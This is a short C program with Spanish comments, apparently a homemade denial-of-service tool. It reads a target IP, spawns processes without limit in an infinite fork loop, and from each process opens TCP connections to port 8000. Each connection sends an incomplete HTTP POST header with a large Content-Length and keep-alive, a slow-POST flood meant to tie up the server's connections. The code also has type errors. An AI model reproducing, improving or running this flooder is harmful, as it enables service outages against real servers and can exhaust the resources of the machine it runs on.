#include<stdio.h>
#include<string.h>	//strlen
#include<sys/socket.h>
#include<arpa/inet.h>	//inet_addr

int main(){

	char *ip[16]; //ip a conectarse
	printf("ip a conectarse: ");
	scanf("%s",ip);

	int port = 8000;

	for (int i =0; i<=3;i++){
		int id = fork();
		if (fork() == 0){
			printf("%s %d\n", "soy el proceso hijo: ", getpid());
		}else{
			printf("%s %d\n", "soy el proceso padre(main): ", getpid()); 
		}
	}

	while (1){
	
		if (fork() == 0){
			printf("%s %d\n", "soy el proceso hijo: ", getpid());
		}else{
			printf("%s %d\n", "soy el proceso padre(main): ", getpid()); 
		}
			printf("intentando conectarse a: %s:%d\n", ip, port);

		int socket_desc; //declaramos el socket
		struct sockaddr_in server; //declaramos una estructura
		char *message , server_reply[2000];

		//Creacion del socket
		socket_desc = socket(AF_INET , SOCK_STREAM , 0); //creamos el socket

		if (socket_desc == -1)
		{
			printf("Could not create socket");
		}

		server.sin_addr.s_addr = inet_addr(ip); //asignacion de la ip a conectarse
		server.sin_family = AF_INET; //tipo de conexion
		server.sin_port = htons( 8000 ); //puerto al que conectarse

		//Connect to remote server
		if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
		{
			puts("connect error");
			return 1;
		}

		puts("Conectado\n");

		//Send some data
		message = "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Opera/9.20 (Windows NT 6.0; U; en)\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";    //mensaje
		if( send(socket_desc , message , strlen(message) , 0) < 0) // send(socket_desc , message , strlen(message) , 0) envia el mensaje
		{
			puts("el encvio del mensaje fue fallido");
			return 1;
		}
		puts("el mensaje se envio correctamente\n");

	}
	
	return 0;
}
